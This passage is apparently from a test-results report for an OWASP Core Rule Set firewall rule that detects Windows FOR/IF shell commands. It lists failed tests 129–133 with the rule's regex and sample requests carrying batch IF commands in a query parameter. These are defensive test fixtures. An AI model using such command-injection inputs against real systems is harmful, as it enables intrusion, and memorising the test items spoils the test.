          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 129,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932270 - Remote Command Execution: Unix Shell Expression Found", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 129,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%25_prog%3A%7E-1%25+NEQ+%5C+%28Set+_prog%3D%25_prog%25%5C%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 130,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 130,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+EXIST+%22temp.txt%22+ECHO+found",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 131,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 131,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+NOT+EXIST+%22temp.txt%22+ECHO+not+found",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 132,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 132,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%22%25var%25%22%3D%3D%22%22+%28SET+var%3Ddefault+value%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 133,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 133,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+NOT+DEFINED+var+%28SET+var%3Ddefault+value%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
